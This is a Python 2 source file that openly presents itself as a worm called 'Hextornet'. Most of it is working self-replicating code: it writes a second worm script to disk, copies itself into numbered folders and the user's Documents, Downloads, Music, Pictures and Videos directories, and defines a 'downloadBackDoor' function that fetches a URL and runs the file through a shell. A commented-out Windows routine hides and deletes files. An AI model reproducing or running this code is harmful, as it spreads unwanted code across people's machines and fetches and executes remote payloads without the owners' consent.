#!/usr/bin/env python

from shutil import copyfile
import os, getpass
from sys import argv
#import win32con, win32api
#from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import os, random, sys, pkg_resources
from urllib2 import urlopen
import subprocess as sp
import shutil
import locale
from random import randint


print(
"""
[==========================]
+                          +
+     WORM HEXTORNET       +
+                          +
[==========================]
"""
)

#Use in windows
"""
	if(os.path.isdir("E:\\")):
		dst = "E:" + "\\hextornet.py"
	elif(os.path.isdir("C:\\")):
		dst = "C:\\Users\\" + usr + "\\hextornet.py"
	
	else:
		dst = os.getcwd() + "hextornet.py"
"""

src = os.path.abspath("hextornet.py")
usr = getpass.getuser()
lang = locale.getdefaultlocale()
directories = ""

lang_es = ['Documentos', 'Descargas', 'Musica', 'Imagenes', 'Videos']
lang_en = ['Documents', 'Downloads', 'Music', 'Pictures', 'Videos']

if lang == ('en_US', 'UTF-8'):
	directories = lang_en
else:
	directories = lang_es

dst = ""

codigo = """

#!/usr/bin/env python

from shutil import copyfile
import os, getpass
from sys import argv
#import win32con, win32api
import os, random, sys, pkg_resources
from urllib2 import urlopen
import subprocess as sp
import shutil
import locale
import random

src = os.path.abspath("hexworm.py")
usr = getpass.getuser()
lang = locale.getdefaultlocale()
dst = ""

def copy(src):
	script = sys.argv
	name = str(script[0])
	b = os.path.getsize(os.path.abspath(src))
	for i in range(0, 4):
		directoryName = 'copy_' + str(random.randint(1000,9999))
		try:
			os.makedirs(directoryName, 0755)
			print("File created: ",directoryName)
			shutil.copy(name, directoryName)
			src = os.path.abspath(directoryName)
		except OSError as e:
			os.chmod(src, 0755)

def downloadBackDoor(url):
	filename = url.split('/')[-1].split('#')[0].split('?')[0]
	content = urlopen(url).read()
        outfile = open(filename, "wb")
        outfile.write(content)
        outfile.close()
        run(os.path.abspath(filename))
	print "==========finish downloading=========="

def run(program):
	process = sp.Popen('python '+program, shell=True)
	process.wait()

def main():
	#hide()
	copy(src)
	#downloadBackDoor("https://github.com/hectormtc/hextornet/archive/master.zip")

if __name__ == "__main__":
	main()
"""



filename = open("hexworm.py", "w")
filename.write(codigo)
filename.close()


def copy(src):
	script = sys.argv
	name = str(script[0])
	b = os.path.getsize(os.path.abspath(src))
	for i in range(0, 4):
		directoryName = "files_" + str(i)
		try:
			os.makedirs(directoryName, 0755)
			shutil.copy(name, directoryName)
			src = os.path.abspath(directoryName)
		except OSError as e:
			os.chmod(src, 0755)

def propagate():
	global lang_es
	global lang_en
	global directories
	print("==========Worm location==========")
	while len(directories) != 0:
		for directory in directories:
			if(os.path.isdir("/" + usr + "/" + directory + "/")):
				try:
					dst = "/" + usr + "/" + directory + "/" + "hextornet.py"
					copyfile(src, dst)
					print'dst',dst
				except:
					print("Ya existe")
			directories.remove(directory)
	
	if lang == ('en_US', 'UTF-8'):
		directories = ['Documents', 'Downloads', 'Music', 'Pictures', 'Videos']
	else:
		directories = ['Documentos', 'Descargas', 'Musica', 'Imagenes', 'Videos']
	
	while len(directories) != 0:
		for directory in directories:
			if(os.path.isdir("/" + usr + "/" + directory + "/")):
				try:
					dst = "/" + usr + "/" + directory + "/" + "hexworm.py"
					copyfile(src, dst)
					print("WORM LOCATION:",dst)
				except:
					print("Ya existe")
			directories.remove(directory)
	print("=================================")

#Use in windows
"""
def hide():
        for fname in os.listdir('.'):
                if fname.find('.py') == len(fname) - len('.py'):
                        #make the file hidden
                        win32api.SetFileAttributes(fname,win32con.FILE_ATTRIBUTE_HIDDEN)
                elif fname.find('.txt') == len(fname) - len('.txt'):
                        #make the file read only
                        win32api.SetFileAttributes(fname,win32con.FILE_ATTRIBUTE_READONLY)
                else:
                        #to force deletion of a file set it to normal
                        win32api.SetFileAttributes(fname, win32con.FILE_ATTRIBUTE_NORMAL)
			os.remove(fname)
"""


def downloadBackDoor(url):
	filename = url.split('/')[-1].split('#')[0].split('?')[0]
	content = urlopen(url).read()
        outfile = open(filename, "wb")
        outfile.write(content)
        outfile.close()
        run(os.path.abspath(filename))
	print "==========finish downloading=========="

def run(program):
	process = sp.Popen('python '+program, shell=True)
	process.wait()

def main():
	copy(src)
	propagate()
	#hide()
	#downloadBackDoor("https://github.com/hectormtc/hextornet/archive/master.zip")


if __name__ == "__main__":
	main()
